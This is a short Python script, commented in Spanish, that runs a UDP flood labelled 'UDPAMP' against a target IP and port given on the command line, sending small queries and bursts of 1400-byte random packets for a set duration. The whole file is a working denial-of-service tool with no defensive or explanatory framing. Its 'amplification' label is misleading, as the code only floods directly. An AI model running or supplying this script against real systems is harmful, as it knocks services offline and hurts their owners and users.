#!/usr/bin/env python3
import socket
import random
import time
import sys

def udpamp_attack(target_ip, target_port, duration):
    print(f"[UDPAMP] Atacando {target_ip}:{target_port} por {duration}s")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            # Paquete pequeño que podría generar amplificación
            small = b'\x00\x01'  # Query pequeña
            sock.sendto(small, (target_ip, target_port))
            
            # Paquetes grandes como si fuera respuesta
            for _ in range(10):
                large = random._urandom(1400)
                sock.sendto(large, (target_ip, target_port))
        except:
            pass
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) == 4:
        udpamp_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
